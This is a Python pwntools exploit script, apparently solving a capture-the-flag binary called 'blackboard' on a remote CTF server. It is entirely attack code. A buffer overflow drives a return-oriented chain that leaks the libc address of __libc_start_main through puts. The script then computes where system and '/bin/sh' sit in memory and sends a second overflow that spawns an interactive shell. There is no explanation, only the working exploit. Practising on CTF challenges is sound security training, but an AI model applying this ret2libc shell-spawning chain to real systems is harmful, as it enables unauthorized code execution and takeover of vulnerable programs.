from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

host = "ctf2.cpaw.site"
port = 9999 

if len(sys.argv) > 1 and sys.argv[1] == '-r':
    p = remote(host, port)
    libc = ELF('./libc')
else:
    p = process('./blackboard')
    libc = ELF('/lib32/libc.so.6')

# main

elf = ELF('./blackboard')

def write(text):
    p.sendline("1")
    p.sendline(text)

write("A"*12)
write("B"*12)
write("C"*12)
write("D"*12)
write("E"*2)
write(p32(elf.plt['puts']))
write(p32(elf.functions['main'].address))
write(p32(elf.got['__libc_start_main']))

p.sendline("2")

p.recvuntil("+\n\n")
leak = u32(p.recv(4))
libc_base = leak - libc.symbols['__libc_start_main']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\0'))

p.sendline("3")

write("A"*12)
write("B"*12)
write("C"*12)
write("D"*12)
write("E"*2)
write(p32(system))
write(p32(0xdeadbeef))
write(p32(binsh))

p.sendline("2")

p.interactive()
